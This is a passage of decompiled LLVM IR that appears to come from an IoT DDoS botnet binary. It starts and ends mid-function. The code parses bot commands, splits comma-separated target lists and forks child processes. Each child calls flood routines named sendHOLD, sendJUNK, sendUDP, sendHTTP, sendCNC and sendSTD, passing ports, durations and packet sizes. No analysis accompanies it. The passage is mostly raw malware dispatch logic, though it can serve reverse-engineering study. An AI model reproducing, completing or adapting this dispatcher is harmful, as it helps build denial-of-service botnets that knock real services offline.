  %v2_11c8057 = icmp eq i32 %v3_11c30, 0
  br i1 %v2_11c8057, label %dec_label_pc_11cb4, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %dec_label_pc_11c24, %dec_label_pc_11c68
  %storemerge2858 = phi i32 [ %v3_11c70, %dec_label_pc_11c68 ], [ %v3_11c30, %dec_label_pc_11c24 ]
  %v0_11c40 = call i32 @listFork()
  %v2_11c48 = icmp eq i32 %v0_11c40, 0
  br i1 %v2_11c48, label %dec_label_pc_11c50, label %dec_label_pc_11c68

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c40
  %v3_11c5c = call i32 @sendHOLD(i32 %storemerge2858, i32 %v1_11be0, i32 %v1_11bfc)
  %v1_11c64 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c40
  store i32 0, i32* @r0, align 4
  %v3_11c70 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_11c80 = icmp eq i32 %v3_11c70, 0
  br i1 %v2_11c80, label %dec_label_pc_11cb4, label %dec_label_pc_11c40

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11bc0
  %v0_11c8c = call i32 @listFork()
  %v2_11c94 = icmp eq i32 %v0_11c8c, 0
  br i1 %v2_11c94, label %dec_label_pc_11c9c, label %dec_label_pc_12bf8

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11c8c
  %v3_11ca8 = call i32 @sendHOLD(i32 %v2_11bc8, i32 %v1_11be0, i32 %v1_11bfc)
  %v1_11cb0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11c68, %dec_label_pc_11c24, %dec_label_pc_11b50
  %v2_11cb8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_21814.1235 to i32), i32* @r1, align 4
  %v3_11cc4 = inttoptr i32 %v2_11cb8 to i8*
  %v4_11cc4 = call i32 @__GI_strcoll(i8* %v3_11cc4, i32 ptrtoint ([5 x i8]* @global_var_21814.1235 to i32))
  %v2_11ccc = icmp eq i32 %v4_11cc4, 0
  br i1 %v2_11ccc, label %dec_label_pc_11cd4, label %dec_label_pc_11e28

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cb4
  %v7_11cdc = icmp slt i32 %arg1, 4
  br i1 %v7_11cdc, label %dec_label_pc_12bf8, label %dec_label_pc_11ce0

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cd4
  %v1_11ce4 = add i32 %tmp, 8
  %v1_11ce8 = inttoptr i32 %v1_11ce4 to i32*
  %v2_11ce8 = load i32, i32* %v1_11ce8, align 4
  store i32 %v2_11ce8, i32* @r0, align 4
  %v1_11cf0 = call i32 @atol(i32 %v2_11ce8)
  %tmp132 = icmp slt i32 %v1_11cf0, 1
  br i1 %tmp132, label %dec_label_pc_12bf8, label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11ce0
  %v1_11d04 = add i32 %tmp, 12
  %v1_11d08 = inttoptr i32 %v1_11d04 to i32*
  %v2_11d08 = load i32, i32* %v1_11d08, align 4
  store i32 %v2_11d08, i32* @r0, align 4
  %v1_11d10 = call i32 @atol(i32 %v2_11d08)
  %v5_11d1c = icmp sgt i32 %v1_11d10, 0
  br i1 %v5_11d1c, label %dec_label_pc_11d24, label %dec_label_pc_12bf8

dec_label_pc_11d24:                               ; preds = %dec_label_pc_11d00
  %v1_11d28 = add i32 %tmp, 4
  %v1_11d2c = inttoptr i32 %v1_11d28 to i32*
  %v2_11d2c = load i32, i32* %v1_11d2c, align 4
  %v2_11d3c = load i32, i32* %v1_11ce8, align 4
  store i32 %v2_11d3c, i32* @r0, align 4
  %v1_11d44 = call i32 @atol(i32 %v2_11d3c)
  %v2_11d58 = load i32, i32* %v1_11d08, align 4
  store i32 %v2_11d58, i32* @r0, align 4
  %v1_11d60 = call i32 @atol(i32 %v2_11d58)
  %v2_11d78 = call i32 @__GI_strchr(i32 %v2_11d2c, i32 44)
  %v2_11d80 = icmp eq i32 %v2_11d78, 0
  br i1 %v2_11d80, label %dec_label_pc_11e00, label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d24
  store i32 %v2_11d2c, i32* @r0, align 4
  %v3_11d94 = call i32 @__GI_strtok(i32 %v2_11d2c, i32* nonnull @global_var_21744.1185)
  %v2_11df454 = icmp eq i32 %v3_11d94, 0
  br i1 %v2_11df454, label %dec_label_pc_11e28, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %dec_label_pc_11d88, %dec_label_pc_11ddc
  %storemerge2655 = phi i32 [ %v3_11de4, %dec_label_pc_11ddc ], [ %v3_11d94, %dec_label_pc_11d88 ]
  %v0_11da4 = call i32 @listFork()
  %v2_11dac = icmp eq i32 %v0_11da4, 0
  br i1 %v2_11dac, label %dec_label_pc_11db4, label %dec_label_pc_11ddc

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11da4
  %v4_11dc0 = call i32 @sendJUNK(i32 %storemerge2655, i32 %v1_11d44, i32 %v1_11d60, i32 0)
  %v2_11dc8 = load i32, i32* @global_var_2b5d0.55, align 4
  %v1_11dd0 = call i32 @__libc_close(i32 %v2_11dc8)
  %v1_11dd8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11ddc:                               ; preds = %dec_label_pc_11da4
  store i32 0, i32* @r0, align 4
  %v3_11de4 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_11df4 = icmp eq i32 %v3_11de4, 0
  br i1 %v2_11df4, label %dec_label_pc_11e28, label %dec_label_pc_11da4

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11d24
  %v0_11e00 = call i32 @listFork()
  %v2_11e08 = icmp eq i32 %v0_11e00, 0
  br i1 %v2_11e08, label %dec_label_pc_11e10, label %dec_label_pc_12bf8

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11e00
  %v4_11e1c = call i32 @sendJUNK(i32 %v2_11d2c, i32 %v1_11d44, i32 %v1_11d60, i32 0)
  %v1_11e24 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11ddc, %dec_label_pc_11d88, %dec_label_pc_11cb4
  %v2_11e2c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_2181c.1237 to i32), i32* @r1, align 4
  %v3_11e38 = inttoptr i32 %v2_11e2c to i8*
  %v4_11e38 = call i32 @__GI_strcoll(i8* %v3_11e38, i32 ptrtoint ([4 x i8]* @global_var_2181c.1237 to i32))
  %v2_11e40 = icmp eq i32 %v4_11e38, 0
  br i1 %v2_11e40, label %dec_label_pc_11e48, label %dec_label_pc_120d8

dec_label_pc_11e48:                               ; preds = %dec_label_pc_11e28
  %v7_11e50 = icmp slt i32 %arg1, 6
  br i1 %v7_11e50, label %dec_label_pc_12bf8, label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %dec_label_pc_11e48
  %v1_11e58 = add i32 %tmp, 12
  %v1_11e5c = inttoptr i32 %v1_11e58 to i32*
  %v2_11e5c = load i32, i32* %v1_11e5c, align 4
  store i32 %v2_11e5c, i32* @r0, align 4
  %v1_11e64 = call i32 @atol(i32 %v2_11e5c)
  %v7_11e6c = icmp eq i32 %v1_11e64, -1
  br i1 %v7_11e6c, label %dec_label_pc_12bf8, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e54
  %v1_11e78 = add i32 %tmp, 8
  %v1_11e7c = inttoptr i32 %v1_11e78 to i32*
  %v2_11e7c = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11e7c, i32* @r0, align 4
  %v1_11e84 = call i32 @atol(i32 %v2_11e7c)
  %v7_11e8c = icmp eq i32 %v1_11e84, -1
  br i1 %v7_11e8c, label %dec_label_pc_12bf8, label %dec_label_pc_11e94

dec_label_pc_11e94:                               ; preds = %dec_label_pc_11e74
  %v1_11e98 = add i32 %tmp, 16
  %v1_11e9c = inttoptr i32 %v1_11e98 to i32*
  %v2_11e9c = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11e9c, i32* @r0, align 4
  %v1_11ea4 = call i32 @atol(i32 %v2_11e9c)
  %v7_11eac = icmp eq i32 %v1_11ea4, -1
  br i1 %v7_11eac, label %dec_label_pc_12bf8, label %dec_label_pc_11eb4

dec_label_pc_11eb4:                               ; preds = %dec_label_pc_11e94
  %v1_11eb8 = add i32 %tmp, 20
  %v1_11ebc = inttoptr i32 %v1_11eb8 to i32*
  %v2_11ebc = load i32, i32* %v1_11ebc, align 4
  store i32 %v2_11ebc, i32* @r0, align 4
  %v1_11ec4 = call i32 @atol(i32 %v2_11ebc)
  %v7_11ecc = icmp eq i32 %v1_11ec4, -1
  br i1 %v7_11ecc, label %dec_label_pc_12bf8, label %dec_label_pc_11ed4

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11eb4
  %v2_11edc = load i32, i32* %v1_11ebc, align 4
  store i32 %v2_11edc, i32* @r0, align 4
  %v1_11ee4 = call i32 @atol(i32 %v2_11edc)
  %v8_11ef8 = icmp sgt i32 %v1_11ee4, 65500
  br i1 %v8_11ef8, label %dec_label_pc_12bf8, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_11ed4
  %v2_11f04 = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11f04, i32* @r0, align 4
  %v1_11f0c = call i32 @atol(i32 %v2_11f04)
  %v8_11f18 = icmp sgt i32 %v1_11f0c, 32
  br i1 %v8_11f18, label %dec_label_pc_12bf8, label %dec_label_pc_11f1c

dec_label_pc_11f1c:                               ; preds = %dec_label_pc_11efc
  %v7_11f20 = icmp eq i32 %arg1, 7
  br i1 %v7_11f20, label %dec_label_pc_11f28, label %dec_label_pc_11f4c

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f1c
  %v1_11f2c = add i32 %tmp, 24
  %v1_11f30 = inttoptr i32 %v1_11f2c to i32*
  %v2_11f30 = load i32, i32* %v1_11f30, align 4
  store i32 %v2_11f30, i32* @r0, align 4
  %v1_11f38 = call i32 @atol(i32 %v2_11f30)
  %v5_11f44 = icmp sgt i32 %v1_11f38, 0
  br i1 %v5_11f44, label %dec_label_pc_11f4c, label %dec_label_pc_12bf8

dec_label_pc_11f4c:                               ; preds = %dec_label_pc_11f1c, %dec_label_pc_11f28
  %v1_11f50 = add i32 %tmp, 4
  %v1_11f54 = inttoptr i32 %v1_11f50 to i32*
  %v2_11f54 = load i32, i32* %v1_11f54, align 4
  %v2_11f64 = load i32, i32* %v1_11e7c, align 4
  store i32 %v2_11f64, i32* @r0, align 4
  %v1_11f6c = call i32 @atol(i32 %v2_11f64)
  %v2_11f80 = load i32, i32* %v1_11e5c, align 4
  store i32 %v2_11f80, i32* @r0, align 4
  %v1_11f88 = call i32 @atol(i32 %v2_11f80)
  %v2_11f9c = load i32, i32* %v1_11e9c, align 4
  store i32 %v2_11f9c, i32* @r0, align 4
  %v1_11fa4 = call i32 @atol(i32 %v2_11f9c)
  %v2_11fb8 = load i32, i32* %v1_11ebc, align 4
  store i32 %v2_11fb8, i32* @r0, align 4
  %v1_11fc0 = call i32 @atol(i32 %v2_11fb8)
  br i1 %v7_11f20, label %dec_label_pc_11fd8, label %dec_label_pc_11ff4

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11f4c
  %v1_11fdc = add i32 %tmp, 24
  %v1_11fe0 = inttoptr i32 %v1_11fdc to i32*
  %v2_11fe0 = load i32, i32* %v1_11fe0, align 4
  store i32 %v2_11fe0, i32* @r0, align 4
  %v1_11fe8 = call i32 @atol(i32 %v2_11fe0)
  br label %dec_label_pc_11ffc

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_11f4c
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11fd8, %dec_label_pc_11ff4
  %storemerge9 = phi i32 [ 10, %dec_label_pc_11ff4 ], [ %v1_11fe8, %dec_label_pc_11fd8 ]
  %v2_12010 = call i32 @__GI_strchr(i32 %v2_11f54, i32 44)
  %v2_12018 = icmp eq i32 %v2_12010, 0
  br i1 %v2_12018, label %dec_label_pc_1209c, label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_11ffc
  store i32 %v2_11f54, i32* @r0, align 4
  %v3_1202c = call i32 @__GI_strtok(i32 %v2_11f54, i32* nonnull @global_var_21744.1185)
  %v2_1209051 = icmp eq i32 %v3_1202c, 0
  br i1 %v2_1209051, label %dec_label_pc_120d8, label %dec_label_pc_1203c

dec_label_pc_1203c:                               ; preds = %dec_label_pc_12020, %dec_label_pc_12078
  %storemerge2452 = phi i32 [ %v3_12080, %dec_label_pc_12078 ], [ %v3_1202c, %dec_label_pc_12020 ]
  %v0_1203c = call i32 @listFork()
  %v2_12044 = icmp eq i32 %v0_1203c, 0
  br i1 %v2_12044, label %dec_label_pc_1204c, label %dec_label_pc_12078

dec_label_pc_1204c:                               ; preds = %dec_label_pc_1203c
  %v6_1206c = call i32 @sendUDP(i32 %storemerge2452, i32 %v1_11f6c, i32 %v1_11f88, i32 %v1_11fa4, i32 %v1_11fc0, i32 %storemerge9)
  %v1_12074 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12078:                               ; preds = %dec_label_pc_1203c
  store i32 0, i32* @r0, align 4
  %v3_12080 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_12090 = icmp eq i32 %v3_12080, 0
  br i1 %v2_12090, label %dec_label_pc_120d8, label %dec_label_pc_1203c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_11ffc
  %v0_1209c = call i32 @listFork()
  %v2_120a4 = icmp eq i32 %v0_1209c, 0
  br i1 %v2_120a4, label %dec_label_pc_120ac, label %dec_label_pc_12bf8

dec_label_pc_120ac:                               ; preds = %dec_label_pc_1209c
  %v6_120cc = call i32 @sendUDP(i32 %v2_11f54, i32 %v1_11f6c, i32 %v1_11f88, i32 %v1_11fa4, i32 %v1_11fc0, i32 %storemerge9)
  %v1_120d4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_120d8:                               ; preds = %dec_label_pc_12078, %dec_label_pc_12020, %dec_label_pc_11e28
  %v2_120dc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_21820.1239 to i32), i32* @r1, align 4
  %v3_120e8 = inttoptr i32 %v2_120dc to i8*
  %v4_120e8 = call i32 @__GI_strcoll(i8* %v3_120e8, i32 ptrtoint ([5 x i8]* @global_var_21820.1239 to i32))
  %v2_120f0 = icmp eq i32 %v4_120e8, 0
  br i1 %v2_120f0, label %dec_label_pc_120f8, label %dec_label_pc_122e0

dec_label_pc_120f8:                               ; preds = %dec_label_pc_120d8
  %v7_12100 = icmp slt i32 %arg1, 6
  br i1 %v7_12100, label %dec_label_pc_12bf8, label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120f8
  %v1_12108 = add i32 %tmp, 4
  %v1_1210c = inttoptr i32 %v1_12108 to i32*
  %v2_1210c = load i32, i32* %v1_1210c, align 4
  %v2_12118 = call i32 @__GI_strchr(i32 %v2_1210c, i32 44)
  %v2_12120 = icmp eq i32 %v2_12118, 0
  br i1 %v2_12120, label %dec_label_pc_12228, label %dec_label_pc_12128

dec_label_pc_12128:                               ; preds = %dec_label_pc_12104
  %v2_12130 = load i32, i32* %v1_1210c, align 4
  store i32 %v2_12130, i32* @r0, align 4
  %v3_1213c = call i32 @__GI_strtok(i32 %v2_12130, i32* nonnull @global_var_21744.1185)
  %v2_1221c49 = icmp eq i32 %v3_1213c, 0
  br i1 %v2_1221c49, label %dec_label_pc_122e0, label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %dec_label_pc_12128, %dec_label_pc_12204
  %v0_1214c = call i32 @listFork()
  %v2_12154 = icmp eq i32 %v0_1214c, 0
  br i1 %v2_12154, label %dec_label_pc_1215c, label %dec_label_pc_12204

dec_label_pc_1215c:                               ; preds = %dec_label_pc_1214c
  %v2_12164 = load i32, i32* %v1_1210c, align 4
  store i32 %v2_12164, i32* @r5, align 4
  %v1_12170 = add i32 %tmp, 8
  %v1_12174 = inttoptr i32 %v1_12170 to i32*
  %v2_12174 = load i32, i32* %v1_12174, align 4
  store i32 %v2_12174, i32* @r6, align 4
  %v1_12180 = add i32 %tmp, 12
  %v1_12184 = inttoptr i32 %v1_12180 to i32*
  %v2_12184 = load i32, i32* %v1_12184, align 4
  store i32 %v2_12184, i32* @r0, align 4
  %v1_1218c = call i32 @atol(i32 %v2_12184)
  %v3_12198 = urem i32 %v1_1218c, 65536
  store i32 %v3_12198, i32* @r7, align 4
  %v1_121a4 = add i32 %tmp, 16
  %v1_121a8 = inttoptr i32 %v1_121a4 to i32*
  %v2_121a8 = load i32, i32* %v1_121a8, align 4
  store i32 %v2_121a8, i32* @r8, align 4
  %v1_121b4 = add i32 %tmp, 20
  %v1_121b8 = inttoptr i32 %v1_121b4 to i32*
  %v2_121b8 = load i32, i32* %v1_121b8, align 4
  store i32 %v2_121b8, i32* @r0, align 4
  %v1_121c0 = call i32 @atol(i32 %v2_121b8)
  store i32 %v1_121c0, i32* @r4, align 4
  %v1_121cc = add i32 %tmp, 24
  %v1_121d0 = inttoptr i32 %v1_121cc to i32*
  %v2_121d0 = load i32, i32* %v1_121d0, align 4
  store i32 %v2_121d0, i32* @r0, align 4
  %v1_121d8 = call i32 @atol(i32 %v2_121d0)
  %v0_121e0 = load i32, i32* @r4, align 4
  %v0_121e8 = load i32, i32* @r5, align 4
  %v0_121ec = load i32, i32* @r6, align 4
  %v0_121f0 = load i32, i32* @r7, align 4
  %v0_121f4 = load i32, i32* @r8, align 4
  %v6_121f8 = trunc i32 %v0_121f0 to i8
  %v7_121f8 = call i32 @sendHTTP(i32 %v0_121e8, i32 %v0_121ec, i8 %v6_121f8, i32 %v0_121f4, i32 %v0_121e0, i32 %v1_121d8)
  %v1_12200 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12204:                               ; preds = %dec_label_pc_1214c
  store i32 0, i32* @r0, align 4
  %v3_1220c = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_1221c = icmp eq i32 %v3_1220c, 0
  br i1 %v2_1221c, label %dec_label_pc_122e0, label %dec_label_pc_1214c

dec_label_pc_12228:                               ; preds = %dec_label_pc_12104
  %v0_12228 = call i32 @listFork()
  %v2_12230 = icmp eq i32 %v0_12228, 0
  br i1 %v2_12230, label %dec_label_pc_12238, label %dec_label_pc_12bf8

dec_label_pc_12238:                               ; preds = %dec_label_pc_12228
  %v2_12240 = load i32, i32* %v1_1210c, align 4
  store i32 %v2_12240, i32* @r5, align 4
  %v1_1224c = add i32 %tmp, 8
  %v1_12250 = inttoptr i32 %v1_1224c to i32*
  %v2_12250 = load i32, i32* %v1_12250, align 4
  store i32 %v2_12250, i32* @r6, align 4
  %v1_1225c = add i32 %tmp, 12
  %v1_12260 = inttoptr i32 %v1_1225c to i32*
  %v2_12260 = load i32, i32* %v1_12260, align 4
  store i32 %v2_12260, i32* @r0, align 4
  %v1_12268 = call i32 @atol(i32 %v2_12260)
  %v3_12274 = urem i32 %v1_12268, 65536
  store i32 %v3_12274, i32* @r7, align 4
  %v1_12280 = add i32 %tmp, 16
  %v1_12284 = inttoptr i32 %v1_12280 to i32*
  %v2_12284 = load i32, i32* %v1_12284, align 4
  store i32 %v2_12284, i32* @r8, align 4
  %v1_12290 = add i32 %tmp, 20
  %v1_12294 = inttoptr i32 %v1_12290 to i32*
  %v2_12294 = load i32, i32* %v1_12294, align 4
  store i32 %v2_12294, i32* @r0, align 4
  %v1_1229c = call i32 @atol(i32 %v2_12294)
  store i32 %v1_1229c, i32* @r4, align 4
  %v1_122a8 = add i32 %tmp, 24
  %v1_122ac = inttoptr i32 %v1_122a8 to i32*
  %v2_122ac = load i32, i32* %v1_122ac, align 4
  store i32 %v2_122ac, i32* @r0, align 4
  %v1_122b4 = call i32 @atol(i32 %v2_122ac)
  %v0_122bc = load i32, i32* @r4, align 4
  %v0_122c4 = load i32, i32* @r5, align 4
  %v0_122c8 = load i32, i32* @r6, align 4
  %v0_122cc = load i32, i32* @r7, align 4
  %v0_122d0 = load i32, i32* @r8, align 4
  %v6_122d4 = trunc i32 %v0_122cc to i8
  %v7_122d4 = call i32 @sendHTTP(i32 %v0_122c4, i32 %v0_122c8, i8 %v6_122d4, i32 %v0_122d0, i32 %v0_122bc, i32 %v1_122b4)
  %v1_122dc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_122e0:                               ; preds = %dec_label_pc_12204, %dec_label_pc_12128, %dec_label_pc_120d8
  %v2_122e4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_21828.1241 to i32), i32* @r1, align 4
  %v3_122f0 = inttoptr i32 %v2_122e4 to i8*
  %v4_122f0 = call i32 @__GI_strcoll(i8* %v3_122f0, i32 ptrtoint ([4 x i8]* @global_var_21828.1241 to i32))
  %v2_122f8 = icmp eq i32 %v4_122f0, 0
  br i1 %v2_122f8, label %dec_label_pc_12300, label %dec_label_pc_12454

dec_label_pc_12300:                               ; preds = %dec_label_pc_122e0
  %v7_12308 = icmp slt i32 %arg1, 4
  br i1 %v7_12308, label %dec_label_pc_12bf8, label %dec_label_pc_1230c

dec_label_pc_1230c:                               ; preds = %dec_label_pc_12300
  %v1_12310 = add i32 %tmp, 8
  %v1_12314 = inttoptr i32 %v1_12310 to i32*
  %v2_12314 = load i32, i32* %v1_12314, align 4
  store i32 %v2_12314, i32* @r0, align 4
  %v1_1231c = call i32 @atol(i32 %v2_12314)
  %tmp134 = icmp slt i32 %v1_1231c, 1
  br i1 %tmp134, label %dec_label_pc_12bf8, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %dec_label_pc_1230c
  %v1_12330 = add i32 %tmp, 12
  %v1_12334 = inttoptr i32 %v1_12330 to i32*
  %v2_12334 = load i32, i32* %v1_12334, align 4
  store i32 %v2_12334, i32* @r0, align 4
  %v1_1233c = call i32 @atol(i32 %v2_12334)
  %v5_12348 = icmp sgt i32 %v1_1233c, 0
  br i1 %v5_12348, label %dec_label_pc_12350, label %dec_label_pc_12bf8

dec_label_pc_12350:                               ; preds = %dec_label_pc_1232c
  %v1_12354 = add i32 %tmp, 4
  %v1_12358 = inttoptr i32 %v1_12354 to i32*
  %v2_12358 = load i32, i32* %v1_12358, align 4
  %v2_12368 = load i32, i32* %v1_12314, align 4
  store i32 %v2_12368, i32* @r0, align 4
  %v1_12370 = call i32 @atol(i32 %v2_12368)
  %v2_12384 = load i32, i32* %v1_12334, align 4
  store i32 %v2_12384, i32* @r0, align 4
  %v1_1238c = call i32 @atol(i32 %v2_12384)
  %v2_123a4 = call i32 @__GI_strchr(i32 %v2_12358, i32 44)
  %v2_123ac = icmp eq i32 %v2_123a4, 0
  br i1 %v2_123ac, label %dec_label_pc_1242c, label %dec_label_pc_123b4

dec_label_pc_123b4:                               ; preds = %dec_label_pc_12350
  store i32 %v2_12358, i32* @r0, align 4
  %v3_123c0 = call i32 @__GI_strtok(i32 %v2_12358, i32* nonnull @global_var_21744.1185)
  %v2_1242046 = icmp eq i32 %v3_123c0, 0
  br i1 %v2_1242046, label %dec_label_pc_12454, label %dec_label_pc_123d0

dec_label_pc_123d0:                               ; preds = %dec_label_pc_123b4, %dec_label_pc_12408
  %storemerge2047 = phi i32 [ %v3_12410, %dec_label_pc_12408 ], [ %v3_123c0, %dec_label_pc_123b4 ]
  %v0_123d0 = call i32 @listFork()
  %v2_123d8 = icmp eq i32 %v0_123d0, 0
  br i1 %v2_123d8, label %dec_label_pc_123e0, label %dec_label_pc_12408

dec_label_pc_123e0:                               ; preds = %dec_label_pc_123d0
  %v4_123ec = call i32 @sendCNC(i32 %storemerge2047, i32 %v1_12370, i32 %v1_1238c, i32 0)
  %v2_123f4 = load i32, i32* @global_var_2b5d0.55, align 4
  %v1_123fc = call i32 @__libc_close(i32 %v2_123f4)
  %v1_12404 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12408:                               ; preds = %dec_label_pc_123d0
  store i32 0, i32* @r0, align 4
  %v3_12410 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_12420 = icmp eq i32 %v3_12410, 0
  br i1 %v2_12420, label %dec_label_pc_12454, label %dec_label_pc_123d0

dec_label_pc_1242c:                               ; preds = %dec_label_pc_12350
  %v0_1242c = call i32 @listFork()
  %v2_12434 = icmp eq i32 %v0_1242c, 0
  br i1 %v2_12434, label %dec_label_pc_1243c, label %dec_label_pc_12bf8

dec_label_pc_1243c:                               ; preds = %dec_label_pc_1242c
  %v4_12448 = call i32 @sendCNC(i32 %v2_12358, i32 %v1_12370, i32 %v1_1238c, i32 0)
  %v1_12450 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_12454:                               ; preds = %dec_label_pc_12408, %dec_label_pc_123b4, %dec_label_pc_122e0
  %v2_12458 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_2182c.1243 to i32), i32* @r1, align 4
  %v3_12464 = inttoptr i32 %v2_12458 to i8*
  %v4_12464 = call i32 @__GI_strcoll(i8* %v3_12464, i32 ptrtoint ([6 x i8]* @global_var_2182c.1243 to i32))
  %v2_1246c = icmp eq i32 %v4_12464, 0
  br i1 %v2_1246c, label %dec_label_pc_12474, label %dec_label_pc_12608

dec_label_pc_12474:                               ; preds = %dec_label_pc_12454
  %v7_1247c = icmp slt i32 %arg1, 4
  br i1 %v7_1247c, label %dec_label_pc_12bf8, label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %dec_label_pc_12474
  %v1_12484 = add i32 %tmp, 8
  %v1_12488 = inttoptr i32 %v1_12484 to i32*
  %v2_12488 = load i32, i32* %v1_12488, align 4
  store i32 %v2_12488, i32* @r0, align 4
  %v1_12490 = call i32 @atol(i32 %v2_12488)
  %tmp135 = icmp slt i32 %v1_12490, 1
  br i1 %tmp135, label %dec_label_pc_12bf8, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_12480
  %v1_124a4 = add i32 %tmp, 12
  %v1_124a8 = inttoptr i32 %v1_124a4 to i32*
  %v2_124a8 = load i32, i32* %v1_124a8, align 4
  store i32 %v2_124a8, i32* @r0, align 4
  %v1_124b0 = call i32 @atol(i32 %v2_124a8)
  %v5_124bc = icmp sgt i32 %v1_124b0, 0
  br i1 %v5_124bc, label %dec_label_pc_124c4, label %dec_label_pc_12bf8

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124a0
  %v1_124c8 = add i32 %tmp, 4
  %v1_124cc = inttoptr i32 %v1_124c8 to i32*
  %v2_124cc = load i32, i32* %v1_124cc, align 4
  %v2_124dc = load i32, i32* %v1_12488, align 4
  store i32 %v2_124dc, i32* @r0, align 4
  %v1_124e4 = call i32 @atol(i32 %v2_124dc)
  %v2_124f8 = load i32, i32* %v1_124a8, align 4
  store i32 %v2_124f8, i32* @r0, align 4
  %v1_12500 = call i32 @atol(i32 %v2_124f8)
  %v2_12518 = call i32 @__GI_strchr(i32 %v2_124cc, i32 44)
  %v2_12520 = icmp eq i32 %v2_12518, 0
  br i1 %v2_12520, label %dec_label_pc_125c0, label %dec_label_pc_12528

dec_label_pc_12528:                               ; preds = %dec_label_pc_124c4
  store i32 %v2_124cc, i32* @r0, align 4
  %v3_12534 = call i32 @__GI_strtok(i32 %v2_124cc, i32* nonnull @global_var_21744.1185)
  %v2_125b443 = icmp eq i32 %v3_12534, 0
  br i1 %v2_125b443, label %dec_label_pc_12608, label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %dec_label_pc_12528, %dec_label_pc_1259c
  %storemerge1844 = phi i32 [ %v3_125a4, %dec_label_pc_1259c ], [ %v3_12534, %dec_label_pc_12528 ]
  %v0_12544 = call i32 @listFork()
  %v2_1254c = icmp eq i32 %v0_12544, 0
  br i1 %v2_1254c, label %dec_label_pc_12554, label %dec_label_pc_1259c

dec_label_pc_12554:                               ; preds = %dec_label_pc_12544
  %v4_12560 = call i32 @sendJUNK(i32 %storemerge1844, i32 %v1_124e4, i32 %v1_12500, i32 0)
  %v3_12570 = call i32 @sendSTD(i32 %storemerge1844, i32 %v1_124e4, i32 %v1_12500)
  %v3_12580 = call i32 @sendHOLD(i32 %storemerge1844, i32 %v1_124e4, i32 %v1_12500)
  %v2_12588 = load i32, i32* @global_var_2b5d0.55, align 4
  %v1_12590 = call i32 @__libc_close(i32 %v2_12588)
  %v1_12598 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_1259c:                               ; preds = %dec_label_pc_12544
  store i32 0, i32* @r0, align 4
  %v3_125a4 = call i32 @__GI_strtok(i32 0, i32* nonnull @global_var_21744.1185)
  %v2_125b4 = icmp eq i32 %v3_125a4, 0
  br i1 %v2_125b4, label %dec_label_pc_12608, label %dec_label_pc_12544

dec_label_pc_125c0:                               ; preds = %dec_label_pc_124c4
  %v0_125c0 = call i32 @listFork()
  %v2_125c8 = icmp eq i32 %v0_125c0, 0
  br i1 %v2_125c8, label %dec_label_pc_125d0, label %dec_label_pc_12bf8

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125c0
  %v4_125dc = call i32 @sendJUNK(i32 %v2_124cc, i32 %v1_124e4, i32 %v1_12500, i32 0)
  %v3_125ec = call i32 @sendSTD(i32 %v2_124cc, i32 %v1_124e4, i32 %v1_12500)
  %v3_125fc = call i32 @sendHOLD(i32 %v2_124cc, i32 %v1_124e4, i32 %v1_12500)
